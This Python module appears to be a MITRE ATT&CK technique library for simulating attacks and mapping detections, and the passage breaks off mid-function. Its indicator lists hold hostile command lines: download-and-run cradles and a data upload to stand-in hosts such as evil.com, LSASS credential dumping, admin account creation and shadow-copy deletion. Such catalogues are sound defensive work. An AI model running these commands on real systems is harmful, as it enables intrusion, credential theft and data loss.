"""
Comprehensive MITRE ATT&CK TTP Library

This module provides a comprehensive library of 50+ MITRE ATT&CK techniques
with realistic attack scenarios, indicators, and cross-vendor detection patterns.
"""

import random
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum

class AttackTactic(str, Enum):
    RECONNAISSANCE = "reconnaissance"
    RESOURCE_DEVELOPMENT = "resource_development"
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence" 
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_AND_CONTROL = "command_and_control"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"

@dataclass
class TTPIndicators:
    """Realistic indicators associated with a TTP."""
    file_names: List[str] = field(default_factory=list)
    file_paths: List[str] = field(default_factory=list)
    command_lines: List[str] = field(default_factory=list)
    registry_keys: List[str] = field(default_factory=list)
    network_indicators: List[str] = field(default_factory=list)
    process_names: List[str] = field(default_factory=list)
    services: List[str] = field(default_factory=list)
    user_agents: List[str] = field(default_factory=list)

@dataclass
class VendorDetection:
    """Vendor-specific detection patterns for a TTP."""
    vendor: str
    detection_rules: List[str]
    log_sources: List[str]
    confidence: float
    false_positive_rate: float

@dataclass
class ComprehensiveTTP:
    """Extended TTP definition with comprehensive attack information."""
    technique_id: str
    technique_name: str
    tactic: AttackTactic
    sub_technique: Optional[str] = None
    description: str = ""
    indicators: TTPIndicators = field(default_factory=TTPIndicators)
    vendor_detections: List[VendorDetection] = field(default_factory=list)
    severity: str = "Medium"  # Low, Medium, High, Critical
    frequency: str = "Common"  # Rare, Uncommon, Common, Very Common
    prerequisites: List[str] = field(default_factory=list)
    mitigation: List[str] = field(default_factory=list)
    related_techniques: List[str] = field(default_factory=list)

class ComprehensiveTTPLibrary:
    """Comprehensive library of MITRE ATT&CK techniques with detailed scenarios."""
    
    def __init__(self):
        self.techniques = self._initialize_comprehensive_techniques()
        self.attack_chains = self._initialize_attack_chains()
        self.campaign_templates = self._initialize_campaign_templates()
    
    def _initialize_comprehensive_techniques(self) -> Dict[str, ComprehensiveTTP]:
        """Initialize comprehensive TTP library with 50+ techniques."""
        return {
            # RECONNAISSANCE
            "T1595.001": ComprehensiveTTP(
                technique_id="T1595.001",
                technique_name="Scanning IP Blocks",
                tactic=AttackTactic.RECONNAISSANCE,
                description="Adversaries may scan victim IP blocks to gather information",
                indicators=TTPIndicators(
                    command_lines=[
                        "nmap -sS 10.0.0.0/24",
                        "masscan -p80,443 192.168.1.0/24",
                        "zmap -p 443 -B 10M",
                        "naabu -host 10.0.0.1-255"
                    ],
                    network_indicators=[
                        "Port scanning patterns",
                        "Sequential IP probing", 
                        "ICMP sweeps",
                        "TCP SYN floods"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Darktrace", ["Network Scanning Detection"], ["network_traffic"], 0.85, 0.15),
                    VendorDetection("Fortinet", ["IPS Port Scan"], ["utm_logs"], 0.90, 0.10)
                ],
                severity="Medium",
                frequency="Common"
            ),
            
            "T1590.005": ComprehensiveTTP(
                technique_id="T1590.005", 
                technique_name="IP Addresses",
                tactic=AttackTactic.RECONNAISSANCE,
                description="Adversaries may gather IP addresses of victim organizations",
                indicators=TTPIndicators(
                    command_lines=[
                        "whois company.com",
                        "dig company.com",
                        "nslookup company.com",
                        "host company.com"
                    ],
                    network_indicators=[
                        "DNS enumeration",
                        "WHOIS queries",
                        "Reverse DNS lookups"
                    ]
                ),
                severity="Low",
                frequency="Very Common"
            ),
            
            # RESOURCE DEVELOPMENT
            "T1583.001": ComprehensiveTTP(
                technique_id="T1583.001",
                technique_name="Domains",
                tactic=AttackTactic.RESOURCE_DEVELOPMENT,
                description="Adversaries may acquire domains for use in operations",
                indicators=TTPIndicators(
                    network_indicators=[
                        "Newly registered domains",
                        "Domain generation algorithms",
                        "Typosquatting domains",
                        "Fast flux DNS"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Recorded Future", ["Domain Intelligence"], ["threat_intel"], 0.80, 0.20),
                    VendorDetection("Mandiant", ["Domain Tracking"], ["intelligence"], 0.85, 0.15)
                ],
                severity="Medium",
                frequency="Common"
            ),
            
            "T1588.002": ComprehensiveTTP(
                technique_id="T1588.002",
                technique_name="Tool",
                tactic=AttackTactic.RESOURCE_DEVELOPMENT,
                description="Adversaries may buy, steal, or download tools for use in operations",
                indicators=TTPIndicators(
                    file_names=[
                        "cobalt_strike.exe",
                        "mimikatz.exe", 
                        "bloodhound.exe",
                        "sharphound.exe",
                        "empire.ps1"
                    ],
                    command_lines=[
                        "git clone https://github.com/EmpireProject/Empire",
                        "wget http://evil.com/tools/mimikatz.exe",
                        "curl -O https://attack.com/bloodhound.zip"
                    ]
                ),
                severity="High",
                frequency="Common"
            ),
            
            # INITIAL ACCESS  
            "T1566.001": ComprehensiveTTP(
                technique_id="T1566.001",
                technique_name="Spearphishing Attachment",
                tactic=AttackTactic.INITIAL_ACCESS,
                description="Adversaries may send spearphishing emails with malicious attachments",
                indicators=TTPIndicators(
                    file_names=[
                        "invoice.exe", "document.scr", "resume.pdf.exe",
                        "photo.jpg.exe", "contract.docm", "report.xlsm"
                    ],
                    file_paths=[
                        "C:\\Users\\*\\Downloads\\invoice.exe",
                        "C:\\Users\\*\\AppData\\Local\\Temp\\document.scr",
                        "%APPDATA%\\Microsoft\\Windows\\recent.exe"
                    ],
                    command_lines=[
                        "powershell.exe -ExecutionPolicy Bypass -File malicious.ps1",
                        "wscript.exe //B malicious.vbs",
                        "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Proofpoint", ["Email Attachment Defense"], ["email_logs"], 0.95, 0.05),
                    VendorDetection("Microsoft Defender", ["Malicious Attachment"], ["endpoint_logs"], 0.90, 0.08),
                    VendorDetection("Symantec", ["Email.Trojan"], ["email_security"], 0.85, 0.10)
                ],
                severity="High",
                frequency="Very Common"
            ),
            
            "T1566.002": ComprehensiveTTP(
                technique_id="T1566.002", 
                technique_name="Spearphishing Link",
                tactic=AttackTactic.INITIAL_ACCESS,
                description="Adversaries may send spearphishing emails with malicious links",
                indicators=TTPIndicators(
                    network_indicators=[
                        "http://phishing-site.com/login",
                        "https://fake-bank.net/verify",
                        "bit.ly/malicious-link",
                        "tinyurl.com/evil123"
                    ],
                    user_agents=[
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Proofpoint", ["URL Defense"], ["email_logs"], 0.92, 0.08),
                    VendorDetection("Zscaler", ["URL Filtering"], ["web_logs"], 0.88, 0.12)
                ],
                severity="High", 
                frequency="Very Common"
            ),
            
            "T1190": ComprehensiveTTP(
                technique_id="T1190",
                technique_name="Exploit Public-Facing Application",
                tactic=AttackTactic.INITIAL_ACCESS,
                description="Adversaries may exploit vulnerabilities in public-facing applications",
                indicators=TTPIndicators(
                    command_lines=[
                        "sqlmap -u http://target.com/login.php",
                        "nikto -h http://vulnerable.com",
                        "python exploit.py --target 192.168.1.100"
                    ],
                    network_indicators=[
                        "SQL injection attempts",
                        "Directory traversal attacks",
                        "Remote code execution payloads",
                        "Buffer overflow attempts"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Fortinet", ["Web Application Attack"], ["utm_logs"], 0.85, 0.15),
                    VendorDetection("Rapid7", ["Vulnerability Exploit"], ["vuln_logs"], 0.90, 0.10)
                ],
                severity="Critical",
                frequency="Common"
            ),
            
            # EXECUTION
            "T1059.001": ComprehensiveTTP(
                technique_id="T1059.001",
                technique_name="PowerShell",
                tactic=AttackTactic.EXECUTION,
                description="Adversaries may abuse PowerShell commands and scripts",
                indicators=TTPIndicators(
                    command_lines=[
                        'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload\')"',
                        "powershell.exe -EncodedCommand JABzAD0ATgBlAHc...",
                        "powershell.exe -Command \"& {Import-Module BitsTransfer; Start-BitsTransfer}\"",
                        "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://bit.ly/e0Mw9w'))\""
                    ],
                    process_names=["powershell.exe", "pwsh.exe"],
                    file_paths=[
                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Microsoft Defender", ["PowerShell Obfuscation"], ["endpoint_logs"], 0.85, 0.15),
                    VendorDetection("CrowdStrike", ["PowerShell Execution"], ["endpoint_logs"], 0.90, 0.10),
                    VendorDetection("Carbon Black", ["PowerShell Script"], ["process_logs"], 0.82, 0.18)
                ],
                severity="High",
                frequency="Very Common"
            ),
            
            "T1059.003": ComprehensiveTTP(
                technique_id="T1059.003",
                technique_name="Windows Command Shell",
                tactic=AttackTactic.EXECUTION,
                description="Adversaries may abuse cmd.exe to execute commands",
                indicators=TTPIndicators(
                    command_lines=[
                        "cmd.exe /c whoami",
                        "cmd.exe /c net user administrator password123 /add",
                        "cmd.exe /c tasklist /svc",
                        "cmd.exe /c dir C:\\ /s /b"
                    ],
                    process_names=["cmd.exe", "conhost.exe"]
                ),
                severity="Medium",
                frequency="Very Common"
            ),
            
            # PERSISTENCE
            "T1053.005": ComprehensiveTTP(
                technique_id="T1053.005",
                technique_name="Scheduled Task",
                tactic=AttackTactic.PERSISTENCE,
                description="Adversaries may abuse Windows Task Scheduler for persistence",
                indicators=TTPIndicators(
                    command_lines=[
                        'schtasks /create /sc minute /mo 1 /tn "\\Microsoft\\Windows\\UpdateCheck" /tr "C:\\temp\\malware.exe"',
                        'schtasks /create /tn "SystemUpdate" /tr "powershell.exe -WindowStyle Hidden -File C:\\temp\\backdoor.ps1"',
                        "at 14:30 C:\\malware\\backdoor.exe"
                    ],
                    registry_keys=[
                        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks",
                        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Microsoft Defender", ["Scheduled Task Creation"], ["endpoint_logs"], 0.80, 0.20),
                    VendorDetection("Symantec", ["Suspicious Task"], ["host_logs"], 0.75, 0.25)
                ],
                severity="Medium",
                frequency="Common"
            ),
            
            "T1547.001": ComprehensiveTTP(
                technique_id="T1547.001",
                technique_name="Registry Run Keys / Startup Folder",
                tactic=AttackTactic.PERSISTENCE,
                description="Adversaries may achieve persistence via registry run keys",
                indicators=TTPIndicators(
                    registry_keys=[
                        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
                    ],
                    command_lines=[
                        'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateCheck" /t REG_SZ /d "C:\\temp\\malware.exe"',
                        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "powershell.exe -File C:\\temp\\backdoor.ps1"'
                    ],
                    file_paths=[
                        "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
                    ]
                ),
                severity="Medium",
                frequency="Common"
            ),
            
            # PRIVILEGE ESCALATION
            "T1055": ComprehensiveTTP(
                technique_id="T1055",
                technique_name="Process Injection",
                tactic=AttackTactic.PRIVILEGE_ESCALATION,
                description="Adversaries may inject code into processes",
                indicators=TTPIndicators(
                    process_names=[
                        "svchost.exe", "explorer.exe", "winlogon.exe", 
                        "lsass.exe", "csrss.exe", "dwm.exe"
                    ],
                    command_lines=[
                        "rundll32.exe shell32.dll,ShellExec_RunDLL malicious.dll",
                        "mavinject.exe 1234 /INJECTRUNNING C:\\temp\\payload.dll",
                        "SetWindowsHookEx injection technique"
                    ],
                    file_paths=[
                        "C:\\Windows\\System32\\rundll32.exe",
                        "C:\\Windows\\System32\\mavinject.exe"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("CrowdStrike", ["Process Injection"], ["endpoint_logs"], 0.90, 0.10),
                    VendorDetection("Microsoft Defender", ["Process Hollowing"], ["endpoint_logs"], 0.85, 0.15),
                    VendorDetection("Darktrace", ["Anomalous Process Activity"], ["network_logs"], 0.75, 0.25)
                ],
                severity="High",
                frequency="Common"
            ),
            
            "T1068": ComprehensiveTTP(
                technique_id="T1068",
                technique_name="Exploitation for Privilege Escalation",
                tactic=AttackTactic.PRIVILEGE_ESCALATION,
                description="Adversaries may exploit vulnerabilities to escalate privileges",
                indicators=TTPIndicators(
                    file_names=[
                        "exploit.exe", "privesc.exe", "kernel_exploit.exe",
                        "uac_bypass.exe", "elevate.exe"
                    ],
                    command_lines=[
                        "exploit.exe -t windows/local/ms16_032",
                        "python privesc.py --technique uac_bypass",
                        "powershell.exe -Command \"& {IEX (Get-ItemProperty HKCU:SOFTWARE\\Classes\\ms-settings\\shell\\open\\command).(default)}\""
                    ]
                ),
                severity="Critical",
                frequency="Uncommon"
            ),
            
            # DEFENSE EVASION
            "T1027": ComprehensiveTTP(
                technique_id="T1027",
                technique_name="Obfuscated Files or Information",
                tactic=AttackTactic.DEFENSE_EVASION,
                description="Adversaries may attempt to make payloads difficult to discover",
                indicators=TTPIndicators(
                    command_lines=[
                        "certutil.exe -decode payload.txt payload.exe",
                        "powershell.exe -EncodedCommand <base64_encoded_command>",
                        "base64 -d encoded_payload > decoded_payload",
                        "openssl enc -d -aes256 -in encrypted.bin -out decrypted.exe"
                    ],
                    file_names=[
                        "encoded.txt", "obfuscated.ps1", "packed.exe",
                        "encrypted.bin", "compressed.rar"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Symantec", ["Packed Executable"], ["endpoint_logs"], 0.80, 0.20),
                    VendorDetection("McAfee", ["Obfuscated Script"], ["endpoint_logs"], 0.75, 0.25)
                ],
                severity="Medium",
                frequency="Common"
            ),
            
            "T1070.004": ComprehensiveTTP(
                technique_id="T1070.004",
                technique_name="File Deletion",
                tactic=AttackTactic.DEFENSE_EVASION,
                description="Adversaries may delete files to cover their tracks",
                indicators=TTPIndicators(
                    command_lines=[
                        "del /f /s /q C:\\temp\\malware.exe",
                        "rm -rf /tmp/payload",
                        "wevtutil.exe cl Security",
                        "sdelete.exe -z C:\\evidence\\"
                    ],
                    file_names=["sdelete.exe", "eraser.exe", "shred", "wipe.exe"]
                ),
                severity="Medium",
                frequency="Common"
            ),
            
            # CREDENTIAL ACCESS
            "T1110.003": ComprehensiveTTP(
                technique_id="T1110.003",
                technique_name="Password Spraying",
                tactic=AttackTactic.CREDENTIAL_ACCESS,
                description="Adversaries may use password spraying attacks",
                indicators=TTPIndicators(
                    command_lines=[
                        "hydra -L userlist.txt -p Password123 rdp://192.168.1.100",
                        "medusa -H targets.txt -U users.txt -P passwords.txt -M ssh",
                        "ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.0/24"
                    ],
                    network_indicators=[
                        "Multiple failed authentication attempts",
                        "Authentication from multiple IPs",
                        "Common password attempts",
                        "Distributed brute force patterns"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Okta", ["Password Spray Detection"], ["auth_logs"], 0.90, 0.10),
                    VendorDetection("Azure AD", ["Brute Force Attack"], ["signin_logs"], 0.88, 0.12),
                    VendorDetection("Splunk", ["Authentication Anomaly"], ["auth_logs"], 0.85, 0.15)
                ],
                severity="High",
                frequency="Common"
            ),
            
            "T1003.001": ComprehensiveTTP(
                technique_id="T1003.001",
                technique_name="LSASS Memory",
                tactic=AttackTactic.CREDENTIAL_ACCESS,
                description="Adversaries may attempt to access credential material from LSASS",
                indicators=TTPIndicators(
                    command_lines=[
                        "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
                        "procdump.exe -ma lsass.exe lsass.dmp",
                        "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump",
                        "powershell.exe -Command \"Get-Process lsass | Out-Minidump\""
                    ],
                    file_names=["mimikatz.exe", "procdump.exe", "lsass.dmp"],
                    process_names=["lsass.exe"]
                ),
                vendor_detections=[
                    VendorDetection("Microsoft Defender", ["LSASS Access"], ["endpoint_logs"], 0.95, 0.05),
                    VendorDetection("CrowdStrike", ["Credential Theft"], ["endpoint_logs"], 0.92, 0.08)
                ],
                severity="Critical",
                frequency="Common"
            ),
            
            # DISCOVERY
            "T1087.001": ComprehensiveTTP(
                technique_id="T1087.001",
                technique_name="Local Account",
                tactic=AttackTactic.DISCOVERY,
                description="Adversaries may attempt to get a listing of local accounts",
                indicators=TTPIndicators(
                    command_lines=[
                        "net user",
                        "net localgroup administrators",
                        "wmic useraccount get name,sid",
                        "Get-LocalUser | Select Name,Enabled,LastLogon"
                    ]
                ),
                severity="Low",
                frequency="Very Common"
            ),
            
            "T1082": ComprehensiveTTP(
                technique_id="T1082",
                technique_name="System Information Discovery",
                tactic=AttackTactic.DISCOVERY,
                description="Adversaries may attempt to get detailed information about the operating system",
                indicators=TTPIndicators(
                    command_lines=[
                        "systeminfo",
                        "hostname",
                        "whoami /all",
                        "wmic computersystem get domain,manufacturer,model,name,username",
                        "Get-ComputerInfo | Select WindowsProductName,TotalPhysicalMemory"
                    ]
                ),
                severity="Low",
                frequency="Very Common"
            ),
            
            # LATERAL MOVEMENT
            "T1021.001": ComprehensiveTTP(
                technique_id="T1021.001", 
                technique_name="Remote Desktop Protocol",
                tactic=AttackTactic.LATERAL_MOVEMENT,
                description="Adversaries may use RDP to laterally move",
                indicators=TTPIndicators(
                    command_lines=[
                        "mstsc.exe /v:192.168.1.100 /u:administrator",
                        "rdesktop -u administrator -p password 192.168.1.100",
                        "net use \\\\192.168.1.100\\c$ /user:administrator password"
                    ],
                    process_names=["mstsc.exe", "rdpclip.exe", "tstheme.exe"],
                    network_indicators=[
                        "RDP connections on port 3389",
                        "Terminal Services authentication",
                        "Remote desktop session establishment"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Fortinet", ["RDP Connection"], ["utm_logs"], 0.85, 0.15),
                    VendorDetection("Darktrace", ["Lateral Movement"], ["network_logs"], 0.80, 0.20)
                ],
                severity="Medium",
                frequency="Common"
            ),
            
            "T1021.002": ComprehensiveTTP(
                technique_id="T1021.002",
                technique_name="SMB/Windows Admin Shares", 
                tactic=AttackTactic.LATERAL_MOVEMENT,
                description="Adversaries may use SMB to laterally move",
                indicators=TTPIndicators(
                    command_lines=[
                        "net use \\\\192.168.1.100\\admin$ /user:administrator password",
                        "psexec.exe \\\\192.168.1.100 -u administrator -p password cmd.exe",
                        "wmic /node:192.168.1.100 /user:administrator /password:password process call create cmd.exe"
                    ],
                    network_indicators=[
                        "SMB connections on ports 139/445",
                        "Admin share access",
                        "PSEXEC service installation"
                    ]
                ),
                severity="High", 
                frequency="Common"
            ),
            
            # COLLECTION
            "T1005": ComprehensiveTTP(
                technique_id="T1005",
                technique_name="Data from Local System",
                tactic=AttackTactic.COLLECTION,
                description="Adversaries may search local drives for sensitive data",
                indicators=TTPIndicators(
                    command_lines=[
                        'dir C:\\ /s /b | findstr /i "password"',
                        'findstr /si password *.txt *.doc *.xls',
                        'Get-ChildItem C:\\ -Recurse | Select-String -Pattern "password|credential"'
                    ]
                ),
                severity="Medium",
                frequency="Common"
            ),
            
            "T1114.001": ComprehensiveTTP(
                technique_id="T1114.001",
                technique_name="Local Email Collection",
                tactic=AttackTactic.COLLECTION,
                description="Adversaries may target user email on local systems",
                indicators=TTPIndicators(
                    file_paths=[
                        "C:\\Users\\*\\AppData\\Local\\Microsoft\\Outlook\\*.ost",
                        "C:\\Users\\*\\AppData\\Local\\Microsoft\\Outlook\\*.pst",
                        "C:\\Users\\*\\Documents\\Outlook Files\\*.pst"
                    ],
                    command_lines=[
                        "copy C:\\Users\\*\\AppData\\Local\\Microsoft\\Outlook\\*.ost C:\\temp\\",
                        "powershell.exe Get-ChildItem -Path C:\\Users\\ -Include *.pst -Recurse"
                    ]
                ),
                severity="High",
                frequency="Uncommon"
            ),
            
            # COMMAND AND CONTROL
            "T1071.001": ComprehensiveTTP(
                technique_id="T1071.001",
                technique_name="Web Protocols",
                tactic=AttackTactic.COMMAND_AND_CONTROL,
                description="Adversaries may communicate using application layer protocols",
                indicators=TTPIndicators(
                    network_indicators=[
                        "HTTP/HTTPS beaconing patterns",
                        "POST requests to suspicious domains",
                        "Base64 encoded payloads in HTTP traffic",
                        "User-Agent strings from known tools"
                    ],
                    user_agents=[
                        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
                        "curl/7.35.0",
                        "python-requests/2.18.4"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Zscaler", ["C2 Beaconing"], ["web_logs"], 0.85, 0.15),
                    VendorDetection("Fortinet", ["C2 Communication"], ["utm_logs"], 0.80, 0.20)
                ],
                severity="High",
                frequency="Very Common"
            ),
            
            "T1105": ComprehensiveTTP(
                technique_id="T1105",
                technique_name="Ingress Tool Transfer",
                tactic=AttackTactic.COMMAND_AND_CONTROL,
                description="Adversaries may transfer tools into a compromised environment",
                indicators=TTPIndicators(
                    command_lines=[
                        "powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('http://evil.com/tool.exe','C:\\temp\\tool.exe')\"",
                        "certutil.exe -urlcache -split -f http://evil.com/malware.exe malware.exe",
                        "curl -o payload.exe http://malicious.com/payload.exe",
                        "wget http://attacker.com/backdoor.sh -O /tmp/backdoor.sh"
                    ],
                    network_indicators=[
                        "File downloads from suspicious domains",
                        "Large file transfers",
                        "Downloads to temporary directories"
                    ]
                ),
                severity="Medium",
                frequency="Common"
            ),
            
            # EXFILTRATION
            "T1041": ComprehensiveTTP(
                technique_id="T1041",
                technique_name="Exfiltration Over C2 Channel",
                tactic=AttackTactic.EXFILTRATION,
                description="Adversaries may steal data by exfiltrating over existing C2",
                indicators=TTPIndicators(
                    network_indicators=[
                        "Large outbound data transfers",
                        "Encrypted data uploads",
                        "ZIP file uploads to C2 servers",
                        "Base64 encoded data in HTTP POST"
                    ],
                    command_lines=[
                        "powershell.exe Compress-Archive -Path C:\\sensitive\\ -DestinationPath C:\\temp\\data.zip",
                        "curl -X POST -F \"file=@sensitive_data.zip\" http://evil.com/upload"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("Darktrace", ["Data Exfiltration"], ["network_logs"], 0.85, 0.15),
                    VendorDetection("Zscaler", ["Large Upload"], ["web_logs"], 0.80, 0.20)
                ],
                severity="High",
                frequency="Common"
            ),
            
            "T1567.002": ComprehensiveTTP(
                technique_id="T1567.002",
                technique_name="Exfiltration to Cloud Storage",
                tactic=AttackTactic.EXFILTRATION,
                description="Adversaries may exfiltrate data to cloud storage services",
                indicators=TTPIndicators(
                    network_indicators=[
                        "uploads to dropbox.com",
                        "uploads to drive.google.com",
                        "uploads to onedrive.com",
                        "uploads to mega.nz"
                    ],
                    command_lines=[
                        "rclone copy C:\\sensitive\\ dropbox:exfil/",
                        "curl -X PUT -T sensitive_file.zip https://api.dropboxapi.com/"
                    ]
                ),
                severity="High",
                frequency="Common"
            ),
            
            # IMPACT
            "T1486": ComprehensiveTTP(
                technique_id="T1486",
                technique_name="Data Encrypted for Impact",
                tactic=AttackTactic.IMPACT,
                description="Adversaries may encrypt data to disrupt availability",
                indicators=TTPIndicators(
                    file_names=[
                        "ransomware.exe", "cryptor.exe", "locker.exe",
                        "encrypt.exe", "ransom.exe"
                    ],
                    command_lines=[
                        "ransomware.exe --encrypt --target C:\\Users\\ --key abcdef123456",
                        "for /r C:\\ %i in (*) do ren \"%i\" \"%i.encrypted\"",
                        "powershell.exe Get-ChildItem C:\\ -Recurse | ForEach-Object {Rename-Item $_.FullName ($_.FullName + '.locked')}"
                    ],
                    file_paths=[
                        "*.encrypted", "*.locked", "*.ransom", "*.crypto",
                        "README_FOR_DECRYPT.txt", "HOW_TO_DECRYPT.html"
                    ]
                ),
                vendor_detections=[
                    VendorDetection("SentinelOne", ["Ransomware Behavior"], ["endpoint_logs"], 0.95, 0.05),
                    VendorDetection("CrowdStrike", ["File Encryption"], ["endpoint_logs"], 0.92, 0.08),
                    VendorDetection("Symantec", ["Ransomware Detection"], ["endpoint_logs"], 0.88, 0.12)
                ],
                severity="Critical",
                frequency="Common"
            ),
            
            "T1490": ComprehensiveTTP(
                technique_id="T1490",
                technique_name="Inhibit System Recovery",
                tactic=AttackTactic.IMPACT,
                description="Adversaries may delete shadow copies and backups",
                indicators=TTPIndicators(
                    command_lines=[
                        "vssadmin.exe delete shadows /all /quiet",
                        "wmic.exe shadowcopy delete",
                        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
                        "bcdedit.exe /set {default} recoveryenabled no"
                    ],
                    process_names=["vssadmin.exe", "bcdedit.exe"]
                ),
                severity="Critical",
                frequency="Uncommon"
            )
            
            # Continue with more techniques as needed...
        }
    
    def _initialize_attack_chains(self) -> Dict[str, List[str]]:
        """Initialize realistic attack chains/kill chains."""
        return {
            "apt_campaign": [
                "T1595.001",  # Scanning IP Blocks
                "T1566.002",  # Spearphishing Link
                "T1059.001",  # PowerShell
                "T1053.005",  # Scheduled Task
                "T1055",      # Process Injection
                "T1003.001",  # LSASS Memory
                "T1087.001",  # Local Account Discovery
                "T1021.001",  # RDP Lateral Movement
                "T1005",      # Data Collection
                "T1041"       # Exfiltration Over C2
            ],
            
            "ransomware_attack": [
                "T1566.001",  # Spearphishing Attachment
                "T1059.003",  # Command Shell
                "T1055",      # Process Injection
                "T1068",      # Privilege Escalation
                "T1070.004",  # File Deletion
                "T1082",      # System Info Discovery
                "T1021.002",  # SMB Lateral Movement
                "T1490",      # Inhibit System Recovery
                "T1486"       # Data Encrypted for Impact
            ],
            
            "insider_threat": [
                "T1087.001",  # Local Account Discovery
                "T1082",      # System Information Discovery
                "T1005",      # Data from Local System
                "T1114.001",  # Local Email Collection
                "T1567.002"   # Exfiltration to Cloud Storage
            ],
            
            "credential_theft": [
                "T1110.003",  # Password Spraying
                "T1059.001",  # PowerShell
                "T1003.001",  # LSASS Memory
                "T1021.001",  # RDP
                "T1041"       # Exfiltration
            ],
            
            "supply_chain": [
                "T1588.002",  # Tool Acquisition
                "T1190",      # Exploit Public Application
                "T1027",      # Obfuscated Files
                "T1547.001",  # Registry Run Keys
                "T1105",      # Ingress Tool Transfer
                "T1071.001",  # Web Protocols
                "T1041"       # Exfiltration Over C2
            ]
        }
    
    def _initialize_campaign_templates(self) -> Dict[str, Dict]:
        """Initialize realistic APT campaign templates."""
        return {
            "apt29_cozy_bear": {
                "name": "APT29 (Cozy Bear)",
                "description": "Russian SVR cyber espionage group",
                "techniques": ["T1566.002", "T1059.001", "T1055", "T1071.001", "T1041"],
                "duration_hours": 72,
                "stealth_level": "high",
                "target_sectors": ["government", "healthcare", "technology"]
            },
            
            "apt28_fancy_bear": {
                "name": "APT28 (Fancy Bear)",
                "description": "Russian GRU military intelligence",
                "techniques": ["T1566.001", "T1190", "T1059.003", "T1003.001", "T1021.001"],
                "duration_hours": 48,
                "stealth_level": "medium", 
                "target_sectors": ["military", "government", "media"]
            },
            
            "carbanak": {
                "name": "Carbanak Financial",
                "description": "Financial crime syndicate",
                "techniques": ["T1566.001", "T1059.001", "T1055", "T1021.001", "T1005", "T1041"],
                "duration_hours": 168,  # 1 week
                "stealth_level": "high",
                "target_sectors": ["banking", "financial", "retail"]
            },
            
            "lazarus_group": {
                "name": "Lazarus Group",
                "description": "North Korean state-sponsored group",
                "techniques": ["T1566.001", "T1027", "T1055", "T1105", "T1486"],
                "duration_hours": 24,
                "stealth_level": "medium",
                "target_sectors": ["cryptocurrency", "banking", "entertainment"]
            }
        }
    
    def get_technique(self, technique_id: str) -> Optional[ComprehensiveTTP]:
        """Get a specific technique by ID."""
        return self.techniques.get(technique_id)
    
    def get_techniques_by_tactic(self, tactic: AttackTactic) -> List[ComprehensiveTTP]:
        """Get all techniques for a specific tactic."""
        return [ttp for ttp in self.techniques.values() if ttp.tactic == tactic]
    
    def get_attack_chain(self, chain_name: str) -> List[ComprehensiveTTP]:
        """Get a complete attack chain as TTP objects."""
        if chain_name not in self.attack_chains:
            return []
        
        return [self.techniques[tid] for tid in self.attack_chains[chain_name] if tid in self.techniques]
    
    def get_campaign_template(self, campaign_name: str) -> Optional[Dict]:
        """Get a campaign template by name."""
        return self.campaign_templates.get(campaign_name)
    
    def generate_realistic_attack_scenario(self, scenario_type: str = "apt_campaign") -> List[ComprehensiveTTP]:
        """Generate a realistic attack scenario with timing and context."""
        if scenario_type not in self.attack_chains:
            scenario_type = "apt_campaign"
        
        base_chain = self.get_attack_chain(scenario_type)
        
        # Add some randomization to make it more realistic
        if len(base_chain) > 5:
            # Sometimes skip or reorder certain techniques
            if random.random() > 0.7:
                # Skip a discovery technique occasionally
                base_chain = [ttp for ttp in base_chain if ttp.tactic != AttackTactic.DISCOVERY or random.random() > 0.3]
            
            # Sometimes add additional techniques
            if random.random() > 0.6:
                additional_techniques = [
                    self.techniques.get("T1087.001"),  # Local Account Discovery
